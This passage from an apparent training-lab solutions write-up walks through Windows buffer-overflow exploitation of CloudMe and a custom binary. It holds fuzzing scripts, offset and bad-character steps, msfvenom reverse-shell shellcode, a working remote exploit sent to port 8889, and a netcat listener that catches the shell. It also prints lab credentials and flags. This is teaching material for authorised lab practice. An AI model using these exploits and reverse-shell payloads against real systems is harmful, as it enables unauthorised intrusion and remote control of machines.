                      0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
                      0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
                      0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
                      0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
                      0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
                      0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
                      0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
                      0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
                      0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
                      0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
                      0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
                      0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
                      0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
                      0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
                      0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
                      0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
                      0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
                      0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
                      0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
                      0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
                      0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
                      0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
                      0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
                      0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
                      0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
                      0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF
                    ])
    offset = 4112
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP + allChars
    with open("chars.wav", "wb") as file:
        file.write(payload)

from struct import pack
def exploit():
    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    buf += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
    buf += b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
    buf += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    buf += b"\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00"

    offset = 4112
    buffer = b"A" * offset
    EIP = pack('<L', 0x00457418)
    NOP = b"\x90" * 32
    payload = buffer + EIP + NOP + buf

    with open('exploit.wav', 'wb') as file:
        file.write(payload)

exploit()
```

# Remote Fuzzing

## Question 1

### "Try the gradual remote fuzzing exercise shown above. What is the payload size that crashes the program 'in bytes'?"

Students first need to RDP into the Windows spawned target machine using `xfreerdp` (or any other tool, such as `Remmina`) with the credentials `htb-student:Academy_student!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student!
```

```
┌─[us-academy-1]─[10.10.14.27]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.22 /u:htb-student /p:Academy_student!

[12:19:05:274] [2266:2268] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[12:19:05:275] [2266:2268] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[12:19:05:275] [2266:2268] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[12:19:05:275] [2266:2268] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[12:19:05:594] [2266:2268] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
<SNIP>
```

Students then need to run the `CloudMe` program found in the Desktop directory:

![[HTB Solutions/Others/z. images/b895ee36dbbe6aa58335134f3385fc3e_MD5.jpg]]

![[HTB Solutions/Others/z. images/7c82aad9142ce1c5197490c249d2454f_MD5.jpg]]

Then, students need to run `x32dbg` and attach to the process named `CloudMe`:

![[HTB Solutions/Others/z. images/8a1072da056ec79a74649b885d35eab6_MD5.jpg]]

Subsequently, students need to write the Python script that will gradually fuzz `CloudMe` and save it with any name (such as "RemoteBOExploit.py") on the Desktop directory:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 8888

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A" * i
            print(f"Fuzzing {i} bytes")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
		print("Could not establish a connection")
fuzz()
```

![[HTB Solutions/Others/z. images/9eb0b0f2814bdcc88769dca4067b8871_MD5.jpg]]

At last, students need to open side-by-side `x32dbg` and the Python script, and whenever prompted with "(Pdb)", they need to provide the letter `c` as input then press `Enter`, until `x32dbg` shows that the program crashed and the `EIP` register is overwritten with `A` characters:

![[HTB Solutions/Others/z. images/56f6a68f7b3533864b1ed5b5f9c0d810_MD5.jpg]]

The program crashed after sending it `1500` bytes of data.

Answer: `1500`

# Remote Exploitation

## Question 1

### "The above server has 'CloudMe' listening on port 8889. Try to use the exploit you built to get a reverse shell and read the flag on the user's Desktop."

Since students have been given the [exploit](https://academy.hackthebox.com/storage/modules/89/scripts/win32bof_exploit_remote_py.txt) ready to be used, they only require the `exploit()` function from it, with other few additional steps.

First, students need to find the IP address of the `tun0` interface for Pwnbox/`PMVPN`:

Code: shell

```shell
ip a | grep tun0
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ip a | grep tun0

4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    inet 10.10.14.215/23 scope global tun0
```

Armed with the `tun0` IP address, students now need to use `msfvenom` to generate shellcode that will execute a reverse-shell call back to their Pwnbox/`PMVPN`:

Code: shell

```shell
msfvenom -p 'windows/shell_reverse_tcp' LHOST=PWNIP LPORT=PWNPO -f python
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p 'windows/shell_reverse_tcp' LHOST=10.10.14.215 LPORT=9001 -f python

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of python file: 1582 bytes
buf =  b""
buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\xd7\x68"
buf += b"\x02\x00\x23\x29\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
```

With the shellcode generated, students now need to write the Python exploit script, making sure that the IP address of the spawned target machine is used when using the `connect` function:

Code: python

```python
s.connect(("STMIP", 8889))
```

Code: python

```python
import socket
from struct import pack
def exploit():
    buf =  b""
    buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b"
    buf += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
    buf += b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
    buf += b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
    buf += b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
    buf += b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
    buf += b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
    buf += b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
    buf += b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
    buf += b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
    buf += b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68"
    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
    buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00"
    buf += b"\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f"
    buf += b"\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x0a\x0a\x0e\xd7\x68"
    buf += b"\x02\x00\x23\x29\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5"
    buf += b"\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec"
    buf += b"\x68\xf0\xb5\xa2\x56\xff\xd5\x68\x63\x6d\x64\x00\x89"
    buf += b"\xe3\x57\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66"
    buf += b"\xc7\x44\x24\x3c\x01\x01\x8d\x44\x24\x10\xc6\x00\x44"
    buf += b"\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56\x53\x56\x68"
    buf += b"\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30"
    buf += b"\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68"
    buf += b"\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
    buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
    
    offset = 1052
    buffer = b"A" * offset
    eip = pack('<L', 0x0069D2E5)
    nop = b"\x90" * 32
    payload = buffer + eip + nop + buf

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("10.129.43.23", 8889))
    s.send(payload)
    s.close()

exploit()
```

Afterward, students need to start a listener on the port they specified when generating the shellcode using `msfvenom`:

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.14.215]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ nc -nvlp 9001

listening on [any] 9001 ...
```

At last, students need to run the Python exploit script and receive a reverse-shell:

Code: shell

```shell
python3 RemoteBOExploit.py
```

![[HTB Solutions/Others/z. images/46ab58610b58676f49b8ad6c739e2c1e_MD5.jpg]]

If not already in the `C:\Users\remote\Desktop` directory, students need to navigate to it and print the contents of the flag:

```
C:\Users\remote\Desktop>type flag.txt

type flag.txt
HTB{r3m073_buff3r_0v3rfl0w3r}
```

Answer: `HTB{r3m073_buff3r_0v3rfl0w3r}`

# Skills Assessment

## Question 1

### "What is the flag found on the Administrator's Desktop folder you got after gaining remote code execution?"

In Pwnbox/`PMVPN`, students first need to download [assessment.zip](https://academy.hackthebox.com/storage/modules/89/assessment.zip):

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/89/assessment.zip 
```

```
┌─[us-academy-1]─[10.10.14.120]─[htb-ac413848@htb-skpsajd7gk]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/89/assessment.zip

--2022-11-23 09:02:52--  https://academy.hackthebox.com/storage/modules/89/assessment.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 122765 (120K) [application/zip]
Saving to: ‘assessment.zip’

assessment.zip            100%[=====================================>] 119.89K  --.-KB/s    in 0.004s  

2022-11-23 09:02:53 (30.8 MB/s) - ‘assessment.zip’ saved [122765/122765]
```

Subsequently, students need to debug the program `win32bof.exe` on a Windows machine. Students can utilize the Windows VM provided in any previous sections of the module, such as `Debugging Windows Programs`. After spawning the Windows machine (students currently need not to spawn the target machine in the Skills Assessment section, as only the Windows one is needed), students need to RDP into it with the credentials `htb-student:Academy_student!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student! /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.120]─[htb-ac413848@htb-skpsajd7gk]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.22 /u:htb-student /p:Academy_student! /dynamic-resolution

[09:10:35:852] [2661:2662] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
<SNIP> 
[09:10:35:584] [2661:2662] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[09:10:35:584] [2661:2662] [ERROR][com.freerdp.crypto] - Common Name (CN):
[09:10:35:584] [2661:2662] [ERROR][com.freerdp.crypto] - 	WIN32BOF-WS01
[09:10:35:584] [2661:2662] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.22:3389 (RDP-Server):
	Common Name: WIN32BOF-WS01
	Subject:     CN = WIN32BOF-WS01
	Issuer:      CN = WIN32BOF-WS01
	Thumbprint:  59:01:59:87:dc:0a:05:9d:2a:3c:af:aa:32:8a:d9:9a:fc:4d:f5:b0:68:61:59:78:47:41:5b:5f:0b:a3:ec:0f
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

![[HTB Solutions/Others/z. images/cacf501994f4e48208f3d23203ad1f90_MD5.jpg]]

Once the RDP session has been established successfully, students need to transfer `assessment.zip` to the Windows target. To do so, students need to start a Python3 web server on Pwnbox/`PMVPN` in the same directory where the folder `assessment.zip` is:

Code: shell

```shell
python3 -m http.server
```

```
┌─[us-academy-1]─[10.10.14.120]─[htb-ac413848@htb-skpsajd7gk]─[~]
└──╼ [★]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Subsequently, on the Windows VM, students need to download `assessment.zip` using `wget` with PowerShell (in the Desktop directory, students can press `Shift` and right-click then select `Open PowerShell window here`):

![[HTB Solutions/Others/z. images/5a55d6eebd9f0cd373aa7d0d71a5b8aa_MD5.jpg]]

Code: powershell

```powershell
wget -O assessment.zip http://PWNIP:8000/assessment.zip
```

```
PS C:\Users\htb-student\Desktop> wget -O assessment.zip http://10.10.14.120:8000/assessment.zip
```

Subsequently, students need to unzip `assessment.zip`:

![[HTB Solutions/Others/z. images/7230b10be5ec57b514a7e1bd55ae04f0_MD5.jpg]]

![[HTB Solutions/Others/z. images/1c9678b3bc91aab21ab5e069ee3da695_MD5.jpg]]

Within `assessment/assessment/`, students need to run the `win32bof` binary:

![[HTB Solutions/Others/z. images/aa63907f0372b5dd2cbf4be071f1fa7b_MD5.jpg]]

Subsequently, students need to launch `x32dbg` and attach to the `win32bof` process:

![[HTB Solutions/Others/z. images/1573cbfe4fed65d469e06017b1207de5_MD5.jpg]]

![[HTB Solutions/Others/z. images/277c5b6644c120aaa97323bd9797e436_MD5.jpg]]

As specified in the beginning of the section, the program listens to connections on port 21449, students can use `netstat` to be assured that the service is functioning:

Code: powershell

```powershell
NETSTAT.EXE -a
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\htb-student> NETSTAT.EXE -a

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:445            WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:3389           WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:5040           WIN32BOF-WS01:0        LISTENING
  TCP    0.0.0.0:21449          WIN32BOF-WS01:0        LISTENING
<SNIP>
```

Before attempting to exploit the binary, students can try to connect to it and see if it returns any response on input, finding out that it does not:

Code: powershell

```powershell
.\nc.exe 127.0.0.1 21449
```

```
PS C:\Users\htb-student\Desktop> .\nc.exe 127.0.0.1 21449

test
foo
bar
```

Subsequently, students need to write a Python script that will gradually fuzz `win32bof`, saving it to the desktop:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def fuzz():
    try:
        for i in range(0,10000,500):
            buffer = b"A" * i
            print(f"Fuzzing {i} bytes")
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            s.send(buffer)
            breakpoint()
            s.close()
    except:
	    print("Could not establish a connection")
fuzz()
```

![[HTB Solutions/Others/z. images/ef6891d898f6741dc98f4244fddb4594_MD5.jpg]]

Then, side by side, students need to run the Python script and keeping pressing `c` to continue until the program crashes. Students will notice that the binary crashes after being sent 500 bytes, and the `EIP` is overwritten with the `A` letter:

![[HTB Solutions/Others/z. images/85113bafd219df3390a5af2fb3d2305a_MD5.jpg]]

Afterward, students need to use `ERC` to create a unique pattern that is 500 bytes long:

Code: powershell

```powershell
ERC --pattern c 500
```

![[HTB Solutions/Others/z. images/7675e718aa743d950eccccede6417eb4_MD5.jpg]]

Students need to copy the pattern that is under "Ascii" to use it within the function that will fill the `EIP` with characters from it:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def EIPOffset():
    pattern = bytes("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac" 
    "9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8" 
    "Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7A" 
    "i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al" 
    "7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6" 
    "Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq", "utf-8")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(pattern)
    s.close()

EIPOffset()
```

![[HTB Solutions/Others/z. images/bb648d1ea0d77e0c9f22898dea994211_MD5.jpg]]

Within `x32dbg`, students need to click the `Reset` button so that it closes the crashed `win32bof` binary and run it again:

![[HTB Solutions/Others/z. images/781b7bdee1b803dc95362cb4aafb5981_MD5.jpg]]

Subsequently, students need to run the Python script that will fill the `EIP` with characters from the generated pattern to notice that `win32bof` crashed with the `EIP` filled with `70413670`:

![[HTB Solutions/Others/z. images/f8896f4dc7b37d7f12d18212cb405632_MD5.jpg]]

Students need to find the ASCII representation of the binary pattern. Thus, they need to right-click on the `EIP` value and select `Modify value`, to find out that the ASCII representation is `pA6p`:

![[HTB Solutions/Others/z. images/d9c5e2703a6e9204ffedd78eb2f2bc9f_MD5.jpg]]

![[HTB Solutions/Others/z. images/43681acad5ed0a8ea0c3f2be530349ec_MD5.jpg]]

Subsequently, students need to use `ERC` to determine the exact position of `pA6p` within the Ascii pattern, finding it to be `469`:

Code: powershell

```powershell
ERC --pattern o pA6p
```

![[HTB Solutions/Others/z. images/10fa9eaf459897b05644b0ddbd5d1382_MD5.jpg]]

Afterward, students need to write a Python script that will control the `EIP`, first testing it with inserting 4 `B` characters:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def EIPControl():
    offset = 469
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

EIPControl()
```

![[HTB Solutions/Others/z. images/c786a7bf185d6855de4038084796777a_MD5.jpg]]

After running the script, students will notice that the `EIP` has been overwritten with 4 `B` characters:

![[HTB Solutions/Others/z. images/a06df7dfbaff616dd8356e2f33436176_MD5.jpg]]

Now, students need to identify bad characters to avoid them in the shellcode and return addresses. First, students need to generate a byte array with `ERC`:

Code: powershell

```powershell
ERC --bytearray
```

![[HTB Solutions/Others/z. images/aa9ce808a44165296a02b889d2ba371c_MD5.jpg]]

This will generate a file on the desktop that contains the byte array, students need to copy the characters under "C#":

![[HTB Solutions/Others/z. images/a22424f3b326303c2ea30866893f4d13_MD5.jpg]]

With the copied characters, students need to write a Python script that will find the bad characters:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def badCharacters():
    characters = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])
    offset = 469
    buffer = b"A" * offset
    EIP = b"B" * 4
    payload = buffer + EIP + characters
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, port))
    s.send(payload)
    s.close()

badCharacters()
```

![[HTB Solutions/Others/z. images/5643f09021968a4587e8dd3d5e697e3b_MD5.jpg]]

Within `x32dbg`, students need to click the `Reset` button so that it closes the crashed `win32bof` binary and run it again. Subsequently, students need to run the Python script, to then compare the input in memory to all characters using `ERC`. First, students need to copy the address of `ESP`, which is `00F8FB48`:

![[HTB Solutions/Others/z. images/9108c59864c52a75352823b35424f8c7_MD5.jpg]]

Then, students need to use the `--compare` option of `ERC` on the `ESP` address and the location of the `.bin` file that contains all characters generated earlier:

![[HTB Solutions/Others/z. images/93d290ee7b6695ca6fb4377c36f531d6_MD5.jpg]]

Code: powershell

```powershell
ERC --compare 00F8FB48 C:\Users\htb-student\Desktop\ByteArray_1.bin
```

Students will notice that `0` (i.e., `0x00`) is a bad character since it truncated the rest of the input:

![[HTB Solutions/Others/z. images/102c2551fb0d54203eaf48bb87c99573_MD5.jpg]]

Now, students need to repeat the same steps above two times. First, students need to exclude the bad character `0x00` from the byte array that `ERC` generates:

Code: powershell

```powershell
ERC --bytearray -bytes 0x00
```

![[HTB Solutions/Others/z. images/3bb1fee764984c814210e0d7d37e35d8_MD5.jpg]]

Then, students need to use the same Python script as before, however, they also need to remove `0x00`:

Code: python

```python
import socket
from struct import pack

IP = "127.0.0.1"
port = 21449

def badCharacters():
    characters = bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
